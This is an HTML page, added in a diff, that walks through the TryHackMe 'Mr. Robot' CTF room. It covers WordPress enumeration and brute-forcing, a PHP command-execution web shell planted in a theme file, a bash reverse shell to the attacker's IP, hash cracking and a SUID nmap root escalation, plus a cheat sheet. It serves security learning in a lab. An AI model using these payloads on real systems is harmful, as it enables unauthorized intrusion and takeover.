@@ -1,0 +1,331 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>TryHackMe — Mr. Robot CTF — Detailed Walkthrough</title>
+
+  <style>
+    /* Page layout inspired by readable technical articles */
+    :root{
+      --bg:#0f1724;
+      --card:#0b1220;
+      --muted:#9aa4b2;
+      --accent:#facc15;
+      --text:#e6eef6;
+      --mono: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Courier New", monospace;
+      --maxw:900px;
+    }
+    html,body{height:100%;}
+    body{
+      margin:0;
+      background:linear-gradient(180deg,#071021 0%, #0f1724 50%);
+      color:var(--text);
+      font-family:Inter, 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+      line-height:1.6;
+    }
+
+    .wrap{max-width:var(--maxw);margin:40px auto;padding:28px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border-radius:12px;box-shadow:0 6px 30px rgba(2,6,23,0.6);border:1px solid rgba(255,255,255,0.03);}
+
+    header h1{margin:0;font-size:28px;letter-spacing:-0.2px;}
+    header p{margin:8px 0 0;color:var(--muted);font-size:14px;}
+
+    .meta{display:flex;gap:12px;align-items:center;margin-top:18px;color:var(--muted);font-size:13px;}
+    .badge{background:rgba(250,204,21,0.12);color:var(--accent);padding:6px 10px;border-radius:999px;font-weight:600;font-size:13px;}
+
+    nav.toc{margin-top:22px;padding:14px;background:rgba(255,255,255,0.02);border-radius:8px;border:1px solid rgba(255,255,255,0.02);}
+    nav.toc ul{margin:0;padding:0;list-style:none;display:flex;flex-wrap:wrap;gap:10px;}
+    nav.toc a{color:var(--muted);text-decoration:none;font-size:13px;}
+    nav.toc a:hover{color:var(--accent);}
+
+    article{margin-top:28px;}
+    h2{color:var(--accent);margin-top:28px;}
+    h3{margin-top:18px;color:#dfe9f6;}
+    p.note{background:rgba(250,204,21,0.06);border-left:3px solid rgba(250,204,21,0.22);padding:10px 12px;color:var(--muted);border-radius:4px;margin:12px 0;}
+
+    pre.cmd{
+      background:#041022;
+      border:1px solid rgba(255,255,255,0.03);
+      color:#dff3ff;
+      padding:14px;
+      overflow:auto;
+      border-radius:8px;
+      font-family:var(--mono);
+      font-size:13px;
+      margin:12px 0;
+      box-shadow: 0 6px 18px rgba(2,6,23,0.5);
+    }
+    code.inline{background:rgba(255,255,255,0.02);padding:2px 6px;border-radius:4px;font-family:var(--mono);}
+
+    .flags{display:flex;gap:12px;flex-wrap:wrap;margin-top:12px;}
+    .flag{background:#071227;padding:10px 12px;border-radius:8px;border-left:4px solid var(--accent);font-family:var(--mono);}
+
+    .section-card{background:rgba(255,255,255,0.015);padding:16px;border-radius:8px;border:1px solid rgba(255,255,255,0.02);margin-top:12px;}
+
+    table{width:100%;border-collapse:collapse;margin-top:12px;}
+    table th, table td{padding:8px;border-bottom:1px solid rgba(255,255,255,0.03);text-align:left;color:var(--muted);font-size:14px}
+    table th{color:#dfe9f6;font-weight:600;}
+
+    footer{margin-top:30px;color:var(--muted);font-size:13px;text-align:center;padding-top:12px;border-top:1px solid rgba(255,255,255,0.02);}
+
+    /* Responsive */
+    @media (max-width:720px){
+      .wrap{margin:18px;padding:16px;}
+      header h1{font-size:20px;}
+      nav.toc ul{flex-direction:column;gap:6px;}
+    }
+
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <header>
+      <h1>TryHackMe — <span style="color:var(--accent)">Mr. Robot</span> — Detailed Walkthrough</h1>
+      <p class="meta">
+        <span class="badge">Room: Mr. Robot</span>
+        <span>Author: Karan Tank</span>
+        <span>Type: Beginner → Intermediate (Web → PrivEsc)</span>
+      </p>
+
+      <nav class="toc" aria-label="Table of contents">
+        <ul>
+          <li><a href="#summary">Summary</a></li>
+          <li><a href="#recon">Recon & Scanning</a></li>
+          <li><a href="#web">Web Enumeration</a></li>
+          <li><a href="#access">Getting a Shell</a></li>
+          <li><a href="#priv">Privilege Escalation</a></li>
+          <li><a href="#flags">Flags</a></li>
+          <li><a href="#lessons">Lessons</a></li>
+        </ul>
+      </nav>
+    </header>
+
+    <article>
+      <section id="summary" class="section-card">
+        <h2>Summary</h2>
+        <p>
+          <strong>Mr. Robot</strong> is a classic TryHackMe machine that mimics the storyline from the TV series. It combines web enumeration (WordPress), credential discovery, and privilege escalation via common
+          misconfigurations. The objective is to capture three flags:
+        </p>
+
+        <div class="flags" aria-hidden="true">
+          <div class="flag">key-1-of-3.txt</div>
+          <div class="flag">key-2-of-3.txt</div>
+          <div class="flag">key-3-of-3.txt</div>
+        </div>
+
+        <p class="note"><strong>Note:</strong> This writeup intentionally includes realistic commands and output examples. Use these techniques only on authorized targets (CTFs, labs you own, or explicit permission).</p>
+      </section>
+
+      <section id="recon" class="section-card">
+        <h2>1 — Recon & Scanning</h2>
+        <h3>Initial port scan</h3>
+        <p>Start with a full TCP scan to discover services:</p>
+        <pre class="cmd"><code>nmap -sC -sV -p- --min-rate=1000 -oN nmap_full.txt &lt;TARGET_IP&gt;</code></pre>
+
+        <p>Typical results (example):</p>
+        <pre class="cmd"><code>
+PORT   STATE SERVICE  VERSION
+22/tcp open  ssh      OpenSSH 7.6p1
+80/tcp open  http     Apache httpd 2.4.29
+443/tcp open  https   Apache httpd 2.4.29 (SSL)
+        </code></pre>
+
+        <p>In <strong>Mr. Robot</strong>, the important service is the web server (HTTP).</p>
+
+        <h3>Quick web check</h3>
+        <p>Open the site in a browser. The landing page is a blog/WordPress themed site with a design referencing to show a prime candidate for web enumeration and configuration leaks.</p>
+      </section>
+
+      <section id="web" class="section-card">
+        <h2>2 — Web Enumeration</h2>
+
+        <h3>Directory brute-force</h3>
+        <p>Use a directory bruteforcer like <code>gobuster</code> or <code>dirb</code> to find hidden files and paths:</p>
+        <pre class="cmd"><code>gobuster dir -u http://&lt;TARGET_IP&gt; -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,log -o gobuster.txt</code></pre>
+
+        <p>Check <code>/robots.txt</code> and other public files:</p>
+        <pre class="cmd"><code>curl -s http://&lt;TARGET_IP&gt;/robots.txt | sed -n '1,120p'</code></pre>
+
+        <p>Example found entries (this is critical):</p>
+        <pre class="cmd"><code>
+User-agent: *
+Disallow: /fsocity.dic
+Disallow: /key-1-of-3.txt
+        </code></pre>
+
+        <p class="note">Finding <code>fsocity.dic</code> is a big clue — it's a large wordlist commonly used in this box for password brute-forcing.</p>
+
+        <h3>Retrieve the file & the first flag</h3>
+        <pre class="cmd"><code>curl -s http://&lt;TARGET_IP&gt;/fsocity.dic -o fsocity.dic
+curl -s http://&lt;TARGET_IP&gt;/key-1-of-3.txt -o key-1-of-3.txt
+cat key-1-of-3.txt</code></pre>
+
+        <p>After this step you should have <code>key-1-of-3.txt</code>.</p>
+
+        <h3>WordPress login</h3>
+        <p>WordPress endpoints may be present:</p>
+        <pre class="cmd"><code>http://&lt;TARGET_IP&gt;/wp-login.php</code></pre>
+
+        <p>Use the discovered dictionary to brute-force a WordPress login for common users.</p>
+
+        <h3>WPScan (optional)</h3>
+        <p>WPScan can enumerate themes, plugins and attempt wordlist logins:</p>
+        <pre class="cmd"><code>wpscan --url http://&lt;TARGET_IP&gt; --enumerate u,vp,tt --threads 10</code></pre>
+
+        <p>To brute-force a username (e.g., <code>Elliot</code>) with the discovered dictionary:</p>
+        <pre class="cmd"><code>wpscan --url http://&lt;TARGET_IP&gt; -U Elliot -P fsocity.dic --disable-tls-checks</code></pre>
+
+        <p class="note">Sometimes it is faster to try common usernames first (e.g., <code>admin</code>, <code>elliot</code>, <code>robot</code>). The show/room often uses <code>Elliot</code>.</p>
+      </section>
+
+      <section id="access" class="section-card">
+        <h2>3 — Getting a Shell</h2>
+        <h3>Successful WP login</h3>
+        <p>Once credentials are found, login to the WordPress admin dashboard. From there, the <em>Appearance → Theme Editor</em> (or plugin editors) can allow direct file edits (if enabled).</p>
+
+        <h3>Upload or inject a web shell</h3>
+        <p>Two common approaches:</p>
+        <ol>
+          <li>Edit a theme PHP file (e.g., <code>404.php</code>) and place a small PHP command execution snippet:</li>
+        </ol>
+        <pre class="cmd"><code>&lt;?php if(isset($_REQUEST['cmd'])){echo "&lt;pre&gt;"; system($_REQUEST['cmd']); echo "&lt;/pre&gt;"; exit; } ?&gt;</code></pre>
+
+        <p>Trigger it:</p>
+        <pre class="cmd"><code>curl "http://&lt;TARGET_IP&gt;/404.php?cmd=id"</code></pre>
+
+        <p>If the host allows reverse connections, use a reverse shell payload. Example using netcat (on your machine):</p>
+        <pre class="cmd"><code># On attackbox
+nc -lvnp 9001
+
+# Trigger from victim (via web shell)
+/bin/bash -i &gt;&amp; /dev/tcp/&lt;your_ip&gt;/9001 0&gt;&amp;1
+</code></pre>
+
+        <p class="note">If direct reverse shells are blocked, use `curl`/`wget` to fetch a more capable payload or use socks/proxy pivoting.</p>
+
+        <h3>Upgrade the shell</h3>
+        <p>Always upgrade to a proper interactive shell:</p>
+        <pre class="cmd"><code>python3 -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl-Z
+stty raw -echo; fg
+reset
+export SHELL=bash; export TERM=xterm-256color</code></pre>
+
+      </section>
+
+      <section id="priv" class="section-card">
+        <h2>4 — Privilege Escalation</h2>
+
+        <h3>Initial checks</h3>
+        <pre class="cmd"><code>uname -a
+id
+ls -la /home</code></pre>
+
+        <p>Look for interesting files in user directories:</p>
+        <pre class="cmd"><code>ls -la /home/robot
+cat /home/robot/.bash_history
+ls -la /home/robot</code></pre>
+
+        <h3>Common MR. ROBOT clues</h3>
+        <p>On this box you often find a file like <code>password.raw-md5</code> or other password hints. Example:</p>
+        <pre class="cmd"><code>cat /home/robot/password.raw-md5
+5f4dcc3b5aa765d61d8327deb882cf99</code></pre>
+
+        <p>Use offline cracking or online services (CrackStation) to convert MD5 hashes where allowed. Locally you can use <code>hashcat</code> or <code>john</code>:</p>
+        <pre class="cmd"><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt</code></pre>
+
+        <h3>Switch user to robot</h3>
+        <p>Once you recover the password, switch user:</p>
+        <pre class="cmd"><code>su - robot
+# or
+ssh robot@localhost</code></pre>
+
+        <p>Grab the second flag (usually in <code>/home/robot</code>):</p>
+        <pre class="cmd"><code>cat /home/robot/key-2-of-3.txt</code></pre>
+
+        <h3>Finding SUID/interesting binaries</h3>
+        <p>Search for SUID files and system binaries that can be abused:</p>
+        <pre class="cmd"><code>find / -perm -4000 -type f 2>/dev/null | sort</code></pre>
+
+        <p>Look also for local binaries of common tools that may allow escape (older `nmap`, `vi`, `less`, `awk`, `perl`, etc.).</p>
+
+        <h3>Escalating to root</h3>
+        <p>One canonical Mr. Robot path is abusing an interactive mode in an older <code>nmap</code> binary. Example (if <code>/usr/local/bin/nmap</code> is SUID):</p>
+        <pre class="cmd"><code>nmap --interactive
+# then at the nmap prompt:
+!sh
+# now you're a shell as root
+id
+cat /root/key-3-of-3.txt</code></pre>
+
+        <p class="note">If <code>nmap --interactive</code> doesn't work, check the binary version and GTFOBins or search for other SUID programs. Privilege escalation is often specific to the environment—enumeration is the key.</p>
+      </section>
+
+      <section id="flags" class="section-card">
+        <h2>5 — Flags (Collected)</h2>
+        <table>
+          <thead><tr><th>Flag</th><th>Location</th><th>User</th></tr></thead>
+          <tbody>
+            <tr><td><code>key-1-of-3.txt</code></td><td><code>/key-1-of-3.txt (robots.txt)</code></td><td>N/A</td></tr>
+            <tr><td><code>key-2-of-3.txt</code></td><td><code>/home/robot/key-2-of-3.txt</code></td><td>robot</td></tr>
+            <tr><td><code>key-3-of-3.txt</code></td><td><code>/root/key-3-of-3.txt</code></td><td>root</td></tr>
+          </tbody>
+        </table>
+
+        <p class="note">Example commands to view flags (from the appropriate user):</p>
+        <pre class="cmd"><code>cat /key-1-of-3.txt
+cat /home/robot/key-2-of-3.txt
+cat /root/key-3-of-3.txt</code></pre>
+      </section>
+
+      <section id="lessons" class="section-card">
+        <h2>6 — Lessons & Takeaways</h2>
+        <ul>
+          <li><strong>Thorough enumeration</strong> (directories, robots.txt, files) often yields the quickest wins.</li>
+          <li><strong>Passwords may be present in unusual formats</strong> (large dictionaries, raw MD5 hashes). Save and reuse discovered artifacts.</li>
+          <li><strong>Web admin interfaces</strong> (WordPress editors, uploaders) are powerful entry points when misconfigured.</li>
+          <li><strong>Privilege escalation</strong> commonly leverages SUID misconfigurations and outdated binaries; always check GTFOBins.</li>
+          <li><strong>Document your steps</strong> — screenshots, commands, and justification are crucial for reports and learning.</li>
+        </ul>
+
+        <h3>Resources & Tools used</h3>
+        <ul>
+          <li>nmap, gobuster/dirb, curl/wget</li>
+          <li>wpscan (WordPress enumeration)</li>
+          <li>john/hashcat for password cracking</li>
+          <li>GTFOBins for SUID/binary abuse ideas</li>
+        </ul>
+
+        <h3>Appendix — Useful commands (cheat sheet)</h3>
+        <pre class="cmd"><code>
+# Scan
+nmap -sC -sV -p- &lt;IP&gt;
+
+# Dir brute
+gobuster dir -u http://&lt;IP&gt; -w /usr/share/wordlists/dirb/common.txt
+
+# Retrieve files
+curl -s http://&lt;IP&gt;/fsocity.dic -o fsocity.dic
+
+# WPScan
+wpscan --url http://&lt;IP&gt; --enumerate u --threads 20
+
+# Reverse shell (listener)
+nc -lvnp 9001
+
+# Upgrade shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+        </code></pre>
+      </section>
+
+    </article>
+
+    <footer>
+      <p>Write-up created by <strong>Karan Tank</strong> — for educational/authorized CTF play only.</p>
+    </footer>
+  </div>
+</body>
+</html>
